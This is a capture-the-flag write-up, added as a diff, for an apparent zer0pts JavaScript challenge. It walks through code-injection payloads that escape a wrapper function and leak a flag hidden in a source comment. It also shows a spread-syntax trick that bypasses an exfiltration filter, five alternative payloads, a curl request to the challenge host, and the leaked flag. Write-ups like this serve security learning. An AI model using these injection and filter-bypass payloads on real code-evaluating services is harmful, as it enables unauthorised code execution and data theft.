@@ -1,0 +1,66 @@
+Separating FLAG comment to a different function
+	'use strict'; (function () { return arguments[0] })(function () {; /* ${FLAG} */ })()
+
+
+Use arrow functions (-1 byte)
+	'use strict'; (function () { return () => arguments[0]})(() => {; /* ${FLAG} */ })()
+
+If arrow functions have no arguments, you need to put parentheses. However, JavaScript allows you to put arguments even though no parameters will be given (-2 bytes)
+	'use strict'; (function () { return a => arguments[0]})(b => {; /* ${FLAG} */ })()
+
+Remove spaces (-4 bytes)
+	'use strict'; (function () { return a=>arguments[0]})(b=>{; /* ${FLAG} */ })()
+
+Send Payload
+	a=>arguments[0]})(b=>{
+Output
+	Error: please do not exfiltrate the flag
+
+Bypass the restriction
+	Convert String to Array
+
+Recent JavaScript has spread syntax, which can be used to converting String to Array as below.
+	[...'abc'] // => ["a", "b", "c"]
+
+And, when you converting Array to String, the result will be comma separated string.
+	["a", "b", "c"] + '' // => "a,b,c"
+
+Final
+	'use strict'; (function () { return a=>[...arguments[0]+0]})(b=>{; /* ${FLAG} */
+
+
+================= Solution 1 =================
+Payload
+	a=>[...arguments[0]+0]})(b=>{
+
+curl http://web.ctf.zer0pts.com:8002/?code=a%3D%3E%5B...arguments%5B0%5D%2B0%5D%7D%29%28b%3D%3E%7B
+	b,=,>,{,;, ,/,*, ,z,e,r,0,p,t,s,{,K,4,n,t,4,n,_,m,3,4,n,s,_,4,d,m,1,r,4,t,1,o,n,_,1,n,_,J,4,p,4,n,3,s,3,}, ,*,/, ,},0
+
+================= Solution 2 =================
+Payload
+	})+(Map=x=>{return[...Map+0]
+Output
+	function () { return }x,=,>,{,r,e,t,u,r,n,[,.,.,.,M,a,p,+,0,],;, ,/,*, ,z,e,r,0,p,t,s,{,K,4,n,t,4,n,_,m,3,4,n,s,_,4,d,m,1,r,4,t,1,o,n,_,1,n,_,J,4,p,4,n,3,s,3,}, ,*,/, ,},0
+
+================= Solution 3 =================
+
+Payload
+	},function _(){return[..._+1]
+Output
+	f,u,n,c,t,i,o,n, ,_,(,),{,r,e,t,u,r,n,[,.,.,.,_,+,1,],;, ,/,*, ,z,e,r,0,p,t,s,{,K,4,n,t,4,n,_,m,3,4,n,s,_,4,d,m,1,r,4,t,1,o,n,_,1,n,_,J,4,p,4,n,3,s,3,}, ,*,/, ,},1
+
+================= Solution 4 =================
+
+
+Payload
+	[...0+this]}).bind(()=>{
+Output
+	0,(,),=,>,{,;, ,/,*, ,z,e,r,0,p,t,s,{,K,4,n,t,4,n,_,m,3,4,n,s,_,4,d,m,1,r,4,t,1,o,n,_,1,n,_,J,4,p,4,n,3,s,3,}, ,*,/, ,}
+
+================= Solution 5 =================
+
+
+Payload
+	x=>y=>[...1+x]})()(_=>{
+Output
+	1,_,=,>,{,;, ,/,*, ,z,e,r,0,p,t,s,{,K,4,n,t,4,n,_,m,3,4,n,s,_,4,d,m,1,r,4,t,1,o,n,_,1,n,_,J,4,p,4,n,3,s,3,}, ,*,/, ,}
